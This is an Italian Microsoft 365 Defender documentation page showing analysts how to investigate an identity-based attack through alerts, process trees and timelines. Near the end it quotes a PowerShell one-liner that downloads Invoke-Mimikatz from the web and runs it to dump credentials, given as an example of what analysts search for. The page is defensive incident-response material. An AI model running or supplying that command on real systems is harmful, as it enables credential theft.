---
title: Esempio di attacco basato su identità
description: Eseguire un'analisi di esempio di un attacco basato sull'identità.
keywords: incidenti, avvisi, indagare, correlazione, attacco, computer, dispositivi, utenti, identità, identità, cassetta postale, posta elettronica, 365, microsoft, m365, risposta a eventi imprevisti, cyberattacco
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: c028289a58247075c33e85d6d6f3797b3ddad7b4
ms.sourcegitcommit: de5fce90de22ba588e75e1a1d2e87e03b9e25ec7
ms.translationtype: MT
ms.contentlocale: it-IT
ms.lasthandoff: 05/10/2021
ms.locfileid: "52297189"
---
# <a name="example-of-an-identity-based-attack"></a>Esempio di attacco basato su identità

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**Si applica a:**
- Microsoft 365 Defender

Microsoft Defender for Identity consente di rilevare tentativi dannosi di compromettere le identità nell'organizzazione. Poiché Defender for Identity si integra con Microsoft 365 Defender, gli analisti della sicurezza possono avere visibilità sulle minacce provenienti da Defender per l'identità, ad esempio i tentativi di elevazione dei privilegi Netlogon sospetti.

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>Analisi dell'attacco in Microsoft Defender for Identity

Microsoft 365 Defender consente agli analisti di filtrare gli avvisi in base all'origine di rilevamento nella **scheda Avvisi** della pagina eventi imprevisti. Nell'esempio seguente l'origine di rilevamento viene filtrata in **Defender per Identità**. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Esempio di filtro dell'origine di rilevamento per Defender for Identity":::

Selezionando **l'avviso sospetto di attacco overpass-the-hash** viene visualizzata una pagina in Microsoft Cloud App Security in cui vengono visualizzate informazioni più dettagliate. Per ulteriori informazioni su un avviso o  un attacco, selezionare Ulteriori [](https://docs.microsoft.com/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) informazioni su questo tipo di avviso per leggere una descrizione dell'attacco e suggerimenti di correzione.
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="Esempio di avviso di attacco overpass-the-hash sospetto"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>Analisi dello stesso attacco in Microsoft Defender for Endpoint

In alternativa, un analista può usare Defender for Endpoint per altre informazioni sull'attività in un endpoint. Selezionare l'evento imprevisto dalla coda degli eventi imprevisti, quindi selezionare la **scheda** Avvisi. Da qui, possono identificare anche l'origine di rilevamento. Un'origine di rilevamento etichettata come EDR sta per Endpoint Detection and Response, che è Defender for Endpoint. Da qui, l'analista seleziona un avviso rilevato da EDR.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Esempio di rilevamento e risposta degli endpoint in Defender for Endpoint"::: 

Nella pagina di avviso vengono visualizzate varie informazioni pertinenti, ad esempio il nome del dispositivo, il nome utente, lo stato dell'analisi automatica e i dettagli dell'avviso. La storia dell'avviso rappresenta una rappresentazione visiva dell'albero del processo. L'albero dei processi è una rappresentazione gerarchica dei processi padre e figlio correlati all'avviso.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Esempio di un albero del processo di avviso in Defender for Endpoint"::: 

Ogni processo può essere espanso per visualizzare ulteriori dettagli. I dettagli che un analista può visualizzare sono i comandi effettivi immessi come parte di uno script dannoso, indirizzi IP di connessione in uscita e altre informazioni utili.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Esempio di dettagli del processo in Defender for Endpoint":::
 
Selezionando **Vedi nella sequenza temporale,** un analista può eseguire il drill-down ulteriormente per determinare l'ora esatta della compromissione. 

Microsoft Defender for Endpoint può rilevare molti file e script dannosi. Tuttavia, a causa di molti usi legittimi per le connessioni in uscita, PowerShell e attività da riga di comando, alcune attività vengono considerate benigne fino a quando non crea un file o un'attività dannosa. Pertanto, l'uso della sequenza temporale consente agli analisti di mettere l'avviso nel contesto dell'attività circostante per determinare l'origine o l'ora dell'attacco che altrimenti viene oscurato dalle attività comuni del file system e degli utenti. 

A tale scopo, un analista inizierà al momento del rilevamento degli avvisi (in rosso) e scorrerà indietro nel tempo per determinare quando è stata effettivamente avviata l'attività originale che ha portato all'attività dannosa. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Esempio di avvio al momento del rilevamento degli avvisi"::: 

È importante comprendere e distinguere attività comuni come le connessioni Windows Update, il traffico di attivazione del software attendibile Windows, altre connessioni comuni ai siti Microsoft, attività Internet di terze parti, attività di Microsoft Endpoint Configuration Manager e altre attività benigne da attività sospette. Un modo per ottenere questo risultato è usare i filtri della sequenza temporale. Esistono molti filtri che possono evidenziare attività specifiche filtrando tutto ciò che l'analista non vuole visualizzare. 

Nell'immagine seguente l'analista ha filtrato per visualizzare solo gli eventi di rete ed elaborazione. In questo modo l'analista può visualizzare le connessioni di rete e i processi che circondano l'evento in cui Blocco note stabilito una connessione con un indirizzo IP, che abbiamo visto anche nell'albero dei processi. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Esempio di utilizzo Blocco note per effettuare una connessione in uscita dannosa"::: 

In questo particolare evento è stato Blocco note una connessione in uscita dannosa. Tuttavia, spesso gli utenti malintenzionati usano semplicemente iexplorer.exe per stabilire connessioni per scaricare un payload dannoso perché in genere iexplorer.exe processi sono considerati attività regolari del Web browser.

Un altro elemento da cercare nella sequenza temporale è l'utilizzo di PowerShell per le connessioni in uscita. L'analista cerca connessioni PowerShell riuscite con comandi quali una connessione in uscita a un sito `IEX (New-Object Net.Webclient)` Web che ospita un file dannoso. 

Nell'esempio seguente, PowerShell è stato usato per scaricare ed eseguire Mimikatz da un sito Web:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
Un analista può cercare rapidamente parole chiave digitando la parola chiave nella barra di ricerca per visualizzare solo gli eventi creati con PowerShell. 

## <a name="next-step"></a>Passaggio successivo

Vedi il percorso di analisi del [phishing.](first-incident-path-phishing.md)

## <a name="see-also"></a>Vedere anche

- [Panoramica degli eventi imprevisti](incidents-overview.md)
- [Gestire gli incidenti](manage-incidents.md)
- [Indagare sugli incidenti](investigate-incidents.md)
